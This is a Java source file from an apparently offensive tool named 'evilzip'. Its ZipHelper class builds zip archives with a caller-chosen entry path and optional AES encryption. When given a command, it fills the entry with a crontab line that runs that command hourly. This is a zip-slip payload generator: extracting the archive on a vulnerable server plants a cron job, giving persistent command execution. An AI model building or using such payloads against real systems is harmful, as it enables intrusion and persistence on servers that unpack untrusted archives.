package net.thekingofduck.core;

import net.lingala.zip4j.core.ZipFile;
import net.lingala.zip4j.model.ZipParameters;
import net.lingala.zip4j.util.Zip4jConstants;
import org.apache.commons.lang.StringUtils;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.InputStream;

/**
 * Project: evilzip
 * Date:2021/6/30 下午1:55
 * @author CoolCat
 * @version 1.0.0
 * Github:https://github.com/TheKingOfDuck
 * When I wirting my code, only God and I know what it does. After a while, only God knows.
 */
public class ZipHelper {

    public static void compress(String inputFile,String fullpath,String password,String cmd,String savePath) throws Exception {

        InputStream inputStream = null;
        File file  = new File(savePath);
        file.delete();

        ZipFile zip = new ZipFile(savePath);
        ZipParameters parameters = new ZipParameters();
        parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE);
        parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL);
        parameters.setFileNameInZip(fullpath);

        if (StringUtils.isNotBlank(password)){
            parameters.setEncryptFiles( true );
            parameters.setEncryptionMethod(Zip4jConstants.ENC_METHOD_AES);
            parameters.setAesKeyStrength(Zip4jConstants.AES_STRENGTH_256);
            parameters.setPassword(password);
        }
        parameters.setSourceExternalStream(true);

        if (StringUtils.isNotBlank(cmd)){
            inputStream = new ByteArrayInputStream(String.format("* */1 * * * %s",cmd).getBytes());
            zip.addStream(inputStream, parameters);
        }else {
            zip.addFile(new File(inputFile), parameters);
        }

        if (inputStream != null) {
            inputStream.close();
        }

    }
}
